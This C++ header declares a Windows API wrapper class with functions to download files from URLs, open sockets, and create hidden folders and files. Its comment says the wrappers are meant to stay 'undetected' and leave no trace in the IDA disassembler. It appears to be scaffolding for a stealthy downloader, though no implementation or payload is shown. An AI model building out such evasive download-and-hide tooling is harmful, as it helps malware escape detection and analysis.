#pragma once
#include <Windows.h>
#include <string>
// all this kernel options are for doing windows api stuff udc and it will not have any trace back using ida.
class kernel
{
public:
	typedef u_short(WINAPI* pfhtons)(u_short hostshort);
	static kernel& get_current();
	void CMessageBox(const char* data, const char* from, int code);
	HMODULE CGetModuleHandle(LPCWSTR module);
	void CExitProcess();
	bool LoadModule(const char* module);
	int CWSAStartup(WORD wVersionRequested, LPWSADATA lpWSAData);
	SOCKET CCreateSocket(int af, int type, int protocol);
	u_short Chtons(u_short hostshort);
	const char* GetCurrentPath();
	const char* GetCurrentName(const char* app = "");
	bool Download(const char* url, const char* path, const char* name);
	void CreateHiddenFolder(LPCSTR  path);
	void MakeFileHidden(LPCSTR max_path);
	std::string ReadUrl(const std::string& url);
};

